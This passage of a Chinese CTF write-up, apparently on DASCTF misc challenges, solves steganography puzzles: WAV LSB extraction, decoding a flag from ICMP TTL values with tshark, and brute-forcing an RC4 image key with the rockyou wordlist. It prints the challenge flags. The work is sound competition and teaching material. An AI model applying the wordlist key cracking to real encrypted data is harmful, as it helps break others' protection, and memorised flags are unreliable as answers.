</span></span><span class=line><span class=cl>    <span class=n>func3</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p>提取完整后可以得到下图</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419162534043.png alt=/posts/f002407/imgs/image-20250419162534043.png height=1600 width=1200></p><p>然后用工具提取一下盲水印即可得到最后的flag：<code>DASCTF{7da5cf04-f7ae-42cf-b98c-7a758a257a65}</code></p><p>当然，这里也可以多换几个工具来提取，找到提取最清晰的即可</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419162621758.png alt=/posts/f002407/imgs/image-20250419162621758.png height=1529 width=2561></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419162925306.png alt=/posts/f002407/imgs/image-20250419162925306.png height=1529 width=2561></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419162956540.png alt=/posts/f002407/imgs/image-20250419162956540.png height=1529 width=2561></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419162847980.png alt=/posts/f002407/imgs/image-20250419162847980.png height=424 width=1504></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419162830766.png alt=/posts/f002407/imgs/image-20250419162830766.png height=783 width=1902></p><h3 class=heading-element id=题目名称-并非乱ping><span>题目名称 并非乱ping</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e5%b9%b6%e9%9d%9e%e4%b9%b1ping class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>题目附件给了一个加密的压缩包、一个wav以及一个<code>hide.py</code></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250417201252117.png alt=/posts/f002407/imgs/image-20250417201252117.png height=322 width=1482></p><p>其中<code>hide.py</code>的内容如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>wave</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hide_message</span><span class=p>(</span><span class=n>input_wav</span><span class=p>,</span> <span class=n>output_wav</span><span class=p>,</span> <span class=n>message</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>wave</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>input_wav</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>wav</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>params</span> <span class=o>=</span> <span class=n>wav</span><span class=o>.</span><span class=n>getparams</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>frames</span> <span class=o>=</span> <span class=n>wav</span><span class=o>.</span><span class=n>readframes</span><span class=p>(</span><span class=n>wav</span><span class=o>.</span><span class=n>getnframes</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>message_binary</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>format</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>char</span><span class=p>),</span> <span class=s1>&#39;08b&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>message</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>message_binary</span> <span class=o>+=</span> <span class=s1>&#39;00000000&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>frames_array</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=n>frames</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>message_binary</span><span class=p>)</span> <span class=o>&gt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>frames_array</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;Message is too long to hide in the given audio file.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>message_binary</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>frames_array</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>frames_array</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mi>253</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>message_binary</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>wave</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>output_wav</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>output_wav_file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>output_wav_file</span><span class=o>.</span><span class=n>setparams</span><span class=p>(</span><span class=n>params</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>output_wav_file</span><span class=o>.</span><span class=n>writeframes</span><span class=p>(</span><span class=n>frames_array</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;successfully!&#34;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>发现是一个利用wav二进制倒数第3位进行LSB隐写的脚本，因此我们写个脚本提取一下隐写的数据即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>wave</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_message</span><span class=p>(</span><span class=n>input_wav</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>wave</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>input_wav</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>wav</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>frames</span> <span class=o>=</span> <span class=n>wav</span><span class=o>.</span><span class=n>readframes</span><span class=p>(</span><span class=n>wav</span><span class=o>.</span><span class=n>getnframes</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>frames_array</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=n>frames</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>binary_message</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>end_marker</span> <span class=o>=</span> <span class=s1>&#39;00000000&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>current_byte</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>byte</span> <span class=ow>in</span> <span class=n>frames_array</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># 提取每个字节的第2位 (从0开始计数)</span>
</span></span><span class=line><span class=cl>        <span class=n>bit</span> <span class=o>=</span> <span class=p>(</span><span class=n>byte</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=n>current_byte</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>bit</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>current_byte</span><span class=p>)</span> <span class=o>==</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>byte_str</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>current_byte</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>byte_str</span> <span class=o>==</span> <span class=n>end_marker</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=n>binary_message</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>byte_str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>current_byte</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>message</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=mi>2</span><span class=p>))</span> <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>binary_message</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>message</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>input_file</span> <span class=o>=</span> <span class=s2>&#34;1.wav&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>hidden_message</span> <span class=o>=</span> <span class=n>extract_message</span><span class=p>(</span><span class=n>input_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>hidden_message</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=c1># password_is_oSthinggg</span></span></span></code></pre></td></tr></table></div></div><p>运行后即可得到解压密码：<code>password_is_oSthinggg</code></p><p>解压后得到一个未知后缀的文件，010打开发现文件存在数据逆置的特征</p><p>因此尝试用CyberChef逆置一下，发现是一个流量包文件</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250417201650812.png alt=/posts/f002407/imgs/image-20250417201650812.png height=1611 width=2384></p><p>打开流量包，结合题目名字很容易知道解题关键在ping上，即ICMP流量中</p><p>翻看流量包的相关字段，猜测flag是被隐藏在了ICMP流量的ttl时延中</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250417201804808.png alt=/posts/f002407/imgs/image-20250417201804808.png height=1199 width=2242></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r download.pcapng -Y <span class=s1>&#39;(icmp) &amp;&amp; (ip.src == 192.168.1.1)&#39;</span> -T fields -e <span class=s1>&#39;ip.ttl&#39;</span> &gt; 1.txt</span></span></code></pre></td></tr></table></div></div><p>然后结合flag的前缀<code>DASCTF{</code>，发现flag被隐藏在ttl二进制的前两位中</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250417203304205.png alt=/posts/f002407/imgs/image-20250417203304205.png height=1623 width=2384></p><p>因此写个脚本提取ttl二进制的前两位，连起来转字符串即可得到最后的flag：<code>DASCTF{627848c0-759c-11ef-999f-000c290c196e}</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>libnum</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;1.txt&#34;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>bin_data</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>item</span><span class=p>))[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>+=</span> <span class=n>bin_data</span><span class=p>[:</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>libnum</span><span class=o>.</span><span class=n>b2s</span><span class=p>(</span><span class=n>res</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1># b&#39;DASCTF{627848c0-759c-11ef-999f-000c290c196e}&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>func1</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=题目名称-steganography_challenges03><span>题目名称 Steganography_challenges0.3</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-steganography_challenges03 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>题目附件： <a href="https://pan.baidu.com/s/1F6ZBdr-Nnhw0UmjF3_9DzA?pwd=f83m" target=_blank rel="external nofollow noopener noreferrer">https://pan.baidu.com/s/1F6ZBdr-Nnhw0UmjF3_9DzA?pwd=f83m</a> 提取码: f83m</p><p>附件已更新，原来的附件是损坏的，感谢<code>@IcePeak</code>师傅的提醒，要不然对着坏的附件，这题这辈子都做不出来了</p></blockquote><blockquote><p>本题的成功解出离不开<code>@IcePeak</code>师傅的帮助</p></blockquote><p>解压附件压缩包，可以得到一个<code>encrypt.py</code>和一张PNG图片，内容如下所示</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>ARC4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rc4_encrypt</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>ARC4</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cipher</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>image</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;flag1.png&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>convert</span><span class=p>(</span><span class=s1>&#39;RGB&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>width</span><span class=p>,</span> <span class=n>height</span> <span class=o>=</span> <span class=n>image</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>new_image</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;RGB&#39;</span><span class=p>,</span> <span class=p>(</span><span class=n>width</span><span class=p>,</span> <span class=n>height</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=c1>#ps:Passwords are common passwords (weak passwords) that may be required...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>height</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>width</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>b</span> <span class=o>=</span> <span class=n>image</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>rgb_bytes</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>r</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>b</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypted_rgb</span> <span class=o>=</span> <span class=n>rc4_encrypt</span><span class=p>(</span><span class=n>rgb_bytes</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>new_image</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>),</span> <span class=p>(</span><span class=n>encrypted_rgb</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>encrypted_rgb</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>encrypted_rgb</span><span class=p>[</span><span class=mi>2</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>new_image</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s1>&#39;Steganography_challenges0.3.png&#39;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/f002407/imgs/image-20250331201515898.png alt=/posts/f002407/imgs/image-20250331201515898.png height=200 width=200></p><p>发现是用弱密码简单加密了一下图片，然后我们用stegsolve打开图片可以发现图片存在LSB隐写</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250331201900614.png alt=/posts/f002407/imgs/image-20250331201900614.png height=1097 width=1504></p><p>因此我们根据LSB隐写的内容写个脚本爆破一下密钥即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>func1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;rockyou.txt&#34;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>,</span><span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>keys</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>key</span> <span class=ow>in</span> <span class=n>keys</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;1.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>w</span><span class=p>,</span><span class=n>h</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>        <span class=n>img1</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;RGB&#39;</span><span class=p>,(</span><span class=n>w</span><span class=p>,</span><span class=n>h</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span><span class=p>,</span><span class=n>g</span><span class=p>,</span><span class=n>b</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>rgb_bytes</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>r</span><span class=p>,</span><span class=n>g</span><span class=p>,</span><span class=n>b</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                <span class=n>dec_rgb</span> <span class=o>=</span> <span class=n>rc4_decrypt</span><span class=p>(</span><span class=n>rgb_bytes</span><span class=p>,</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>img1</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>),(</span><span class=n>dec_rgb</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>dec_rgb</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=n>dec_rgb</span><span class=p>[</span><span class=mi>2</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>        <span class=c1># img1.show()</span>
</span></span><span class=line><span class=cl>        <span class=n>bin_data</span> <span class=o>=</span> <span class=p>(</span><span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>img1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>flatten</span><span class=p>()</span><span class=o>.</span><span class=n>astype</span><span class=p>(</span><span class=nb>str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>libnum</span><span class=o>.</span><span class=n>b2s</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>bin_data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>[:</span><span class=mi>100</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;flag&#39;</span> <span class=ow>in</span> <span class=n>res</span> <span class=ow>or</span> <span class=sa>b</span><span class=s1>&#39;DASCTF&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 爆破成功，密钥是 </span><span class=si>{</span><span class=n>key</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>[:</span><span class=mi>150</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=c1># [+] 爆破成功，密钥是 password</span>
</span></span><span class=line><span class=cl><span class=c1># b&#34;DASCTF{01d0eed8-2e4b,Do you know DWT-QIM? Now I&#39;ll give you the key information,</span>
